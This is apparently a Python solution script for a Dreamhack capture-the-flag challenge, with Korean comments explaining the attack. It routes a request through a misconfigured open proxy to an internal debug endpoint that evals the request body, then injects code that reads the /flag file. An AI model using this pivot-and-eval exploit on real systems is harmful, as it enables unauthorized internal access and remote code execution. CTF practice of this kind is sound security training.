import json
import requests

# 풀이
# 1. 문제에서 제공하는 두가지 도커 컨테이너 중 proxy에 있는 proxy.conf 파일에서 아래와 같이 프록시 연결을 외부에서
#    별도의 인증이나 제한없이 연결할 수 있도록 설정되어 있음
# 2. 1의 내용을 이용하여 http 프록시 주소 설정을 문제의 원격지 서버로 설정한 다음 api:8000 URL을 대상으로 
#    internal/debug URI에 데이터를 보낼수가 있음
# 3. /internal/debug 페이지의 기능을 확인해보면 평문으로 들어온 Body 데이터를 그대로 x 변수에 넣고 eval 함수로 실행하므로
#    x에 명령어를 삽입하면 Remote Code Execution 취약점 트리거가 가능함
# 4. 2, 3의 내용을 이용하여 /flag 파일을 읽어 플래그 획득

INTERNAL_URL = "http://api:8000/internal/debug"
HTTP_PROXY_URL = "http://host1.dreamhack.games:13484"

FLAG = ""

DATA = "open('/flag', mode='r').read()"

PROXIES = {
    "http" : HTTP_PROXY_URL
}

HEADERS = {
    'Content-Type': 'text/plain'
}

resp = requests.post(INTERNAL_URL, data=DATA, proxies=PROXIES, headers=HEADERS)

FLAG = json.loads(resp.text).replace('\n', '')

print(f"FLAG : {FLAG}")